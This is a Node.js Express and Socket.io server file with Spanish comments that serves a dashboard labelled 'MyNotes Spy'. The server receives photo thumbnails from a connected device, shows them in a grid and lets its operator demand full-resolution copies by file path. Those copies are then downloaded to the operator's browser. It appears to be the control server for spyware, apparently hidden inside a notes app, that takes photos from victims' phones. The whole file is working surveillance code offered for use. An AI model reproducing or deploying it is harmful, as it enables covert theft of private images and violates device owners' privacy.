const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Control</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; }
                
                /* HEADER FIJO */
                .header { 
                    position: sticky; top: 0; background: rgba(18, 18, 18, 0.95); z-index: 100; 
                    padding: 15px; border-bottom: 2px solid #333; margin-bottom: 15px;
                    display: flex; flex-direction: column; gap: 10px;
                    box-shadow: 0 4px 10px rgba(0,0,0,0.5);
                }

                .controls { display: flex; justify-content: space-between; align-items: center; }

                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
                
                .card { 
                    background: #1e1e1e; border-radius: 8px; overflow: hidden; 
                    text-align: center; border: 1px solid #333; position: relative;
                    animation: fadeIn 0.5s;
                }
                @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

                .card img { width: 100%; height: 110px; object-fit: cover; opacity: 0.7; }
                .card.hd img { opacity: 1; border-bottom: 3px solid #00e676; height: 130px; }
                
                .info { padding: 5px; font-size: 10px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

                /* BOTONES */
                .btn-req { 
                    background: #6200ea; border: none; padding: 10px; width: 100%; 
                    cursor: pointer; color: white; font-weight: bold; font-size: 11px;
                }
                .btn-req:hover { background: #7c43bd; }
                .btn-req:disabled { background: #333; cursor: wait; color: #777; }

                /* BOTÓN DE PAUSA */
                #btnPause {
                    padding: 10px 25px; font-size: 14px; font-weight: bold; border: none; border-radius: 5px;
                    cursor: pointer; background: #ff1744; color: white; width: 100%;
                    transition: background 0.3s;
                }
                
                #status { font-weight: bold; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="header">
                <div class="controls">
                    <div>
                        <span style="font-size: 20px;">📡 MyNotes Spy</span>
                        <div id="status" style="color: #666; font-size: 12px; margin-top: 5px;">Esperando...</div>
                    </div>
                    <div style="text-align: right;">
                        <span id="totalCounter" style="color: #00e676; font-size: 18px; font-weight: bold;">0</span>
                        <div style="font-size: 10px; color: #aaa;">FOTOS TOTALES</div>
                    </div>
                </div>
                <button id="btnPause" onclick="togglePause()">⏸ CONGELAR PANTALLA</button>
            </div>

            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');
                const status = document.getElementById('status');
                const totalCounter = document.getElementById('totalCounter');
                const btnPause = document.getElementById('btnPause');

                let isPaused = false;
                let pendingBuffer = []; // Aquí guardaremos los DATOS, no el HTML
                let count = 0;

                function togglePause() {
                    isPaused = !isPaused;
                    
                    if (isPaused) {
                        btnPause.style.background = "#ff9100"; // Naranja
                        btnPause.innerText = "⏸ PAUSADO (Esperando...)";
                    } else {
                        // AL REANUDAR
                        btnPause.style.background = "#ff1744"; // Rojo normal
                        btnPause.innerText = "⏸ CONGELAR PANTALLA";
                        
                        // Procesar todo lo acumulado
                        if (pendingBuffer.length > 0) {
                            status.innerText = "⚡ Procesando " + pendingBuffer.length + " fotos acumuladas...";
                            
                            // Inyectamos todo lo pendiente
                            pendingBuffer.forEach(data => createCard(data));
                            
                            // Limpiamos el buffer
                            pendingBuffer = [];
                        }
                    }
                }

                // Función dedicada a crear la tarjeta
                function createCard(data) {
                    if(document.getElementById(data.path)) return; // Evitar duplicados

                    count++;
                    totalCounter.innerText = count;

                    const card = document.createElement('div');
                    card.className = 'card';
                    card.id = data.path;
                    card.innerHTML = \`
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <div class="info">\${data.name}</div>
                        <button class="btn-req" onclick="pedirYDescargar(this, '\${data.path}')">⚡ OBTENER HD</button>
                    \`;
                    grid.prepend(card);
                }

                socket.on('connection_alert', msg => {
                    status.innerText = msg;
                    status.style.color = msg.includes("Conectado") ? "#00e676" : "#ff1744";
                });

                // 1. LLEGA MINIATURA
                socket.on('new_preview', data => {
                    if (isPaused) {
                        // Si está pausado, SOLO guardamos en el array y actualizamos el botón
                        pendingBuffer.push(data);
                        btnPause.innerText = "▶ REANUDAR (" + pendingBuffer.length + " pendientes)";
                    } else {
                        // Si no está pausado, creamos la tarjeta inmediatamente
                        createCard(data);
                    }
                });

                // 2. LLEGA HD (Esta siempre pasa, aunque esté pausado, para que se descargue)
                socket.on('receive_full', data => {
                    downloadBase64File(data.image64, data.name);
                    
                    const originalName = data.name.replace("HD_", "");
                    const cards = document.getElementsByClassName('card');
                    
                    for(let card of cards) {
                        if(card.innerHTML.includes(originalName)) {
                            card.classList.add('hd');
                            card.querySelector('img').src = "data:image/jpeg;base64," + data.image64;
                            const btn = card.querySelector('button');
                            btn.innerText = "✅ LISTO";
                            btn.style.background = "#00c853";
                            btn.style.color = "white";
                        }
                    }
                });

                function pedirYDescargar(btn, path) {
                    btn.innerText = "⏳ ...";
                    btn.disabled = true;
                    socket.emit('order_download', { path: path });
                }

                function downloadBase64File(base64Data, fileName) {
                    const link = document.createElement('a');
                    link.href = "data:image/jpeg;base64," + base64Data;
                    link.download = fileName;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    io.emit('connection_alert', '✅ Dispositivo Conectado');

    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') io.emit('new_preview', data);
        else if (data.dataType === 'full_image') io.emit('receive_full', data);
    });

    socket.on('order_download', (data) => socket.broadcast.emit('request_full_image', data));
    socket.on('disconnect', () => io.emit('connection_alert', '❌ Desconectado'));
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
